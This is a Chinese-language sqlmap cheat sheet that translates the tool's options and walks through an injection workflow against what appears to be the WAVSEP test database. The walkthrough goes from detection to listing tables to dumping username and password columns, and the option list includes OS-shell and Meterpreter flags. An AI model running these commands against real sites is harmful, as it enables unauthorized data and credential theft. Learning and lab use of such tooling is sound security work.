# SQLMap

[]: # Language: markdown  
[]: # Path: sqlmap.md

```shell
目标:至少要选中一个参数
  -u URL, --url=URL   目标为 URL (例如. "http://www.site.com/vuln.php?id=1")
  -g GOOGLEDORK       将谷歌dork的结果作为目标url
请求:
  这些选项可用于指定如何连接到目标URL
  --data=DATA         数据字符串通过POST发送
  --cookie=COOKIE     HTTP Cookie的值
  --random-agent      随机选择 HTTP User-Agent 头的值
  --proxy=PROXY       使用代理去连接目标URL
  --tor               使用匿名网络
  --check-tor         检查Tor是否正确使用
注入:
  这些选项可用于指定要测试哪些参数，提供自定义注入负载和可选篡改脚本
  -p TESTPARAMETER    可测试的参数
  --dbms=DBMS         将后端DBMS强制到此值
检测:
  这些选项可用于定制检测阶段
  --level=LEVEL       执行的测试级别(1-5, 默认 1)
  --risk=RISK         执行测试的风险 (1-3, 默认 1)
技术:
  这些选项可用于调整特定SQL注入的测试的技术
  --technique=TECH    SQL注入技术选择 (默认 "BEUSTQ")
枚举:
  T这些选项可用于枚举后端数据库管理系统的信息、结构和数据表。此外，还可以运行自己的SQL语句
  -a, --all           检索全部
  -b, --banner        检索 banner
  --current-user      检索当前用户
  --current-db        检索当前数据库
  --passwords         列出用户密码的hash值
  --tables            列出表
  --columns           列出字段
  --schema            列出DBMS schema
  --dump              Dump DBMS数据库表的条目
  --dump-all          Dump 所有DBMS数据库表的条目
  -D DB               指定数据库
  -T TBL              指定表
  -C COL              指定字段
操作系统访问:
  这些选项可用于访问后端数据库管理系统底层操作系统
  --os-shell          提示为交互式操作系统shell
  --os-pwn            提示为OOB外壳，Meterpreter或VNC
通用:
  这些选项可用于设置一些通用的工作参数
  --batch             永远不要要求用户输入，使用默认行为
  --flush-session     刷新当前目标的会话文件
杂项:
  --sqlmap -shell      提示输入交互式sqlmap shell
  --wizard            初学者的简单向导界面
```

### 使用 sqlmap

#### 1.对 url 进行检测，判断是否存在 SQL 注入

```shell
python sqlmap.py -u "url" --batch
```

跑完以后发现存在注入，，参数是 username 注入类型为盲注，数据库是 mysql,后端语言是 jsp

#### 2.获取数据库

```shell
python sqlmap.py -u URL --dbs --batch 获取全部数据库
python sqlmap.py -u URL --current-db --batch 获取当前数据库
```

**获取到了当前的数据库为 wavsepDB**

#### 3.获取当前数据库里所有表

```shell
python sqlmap.py -u URL -D wavsepDB --tables --batch
```

#### 4.获取表的字段

```shell
python sqlmap.py -u URL -D wavsepDB -T users --columns --batch
```

如图获取到上面字段以后，我们就开始 dump 字段内容了。

#### 5.dump 字段内容

```shell
python sqlmap.py -u URL -D wavsepDB -T users -C "password,username" --dump --batch
```

如果字段内容多的话可以再加上如 --start 1 --stop 100 这样就取 1-100 条数据

--dump 可以换成 --dump-all 则导出全部的内容

#### Post 类型

```shell
-u "http://www.baidu.com/login.php" --data "username=admin&password=admin" --batch
```
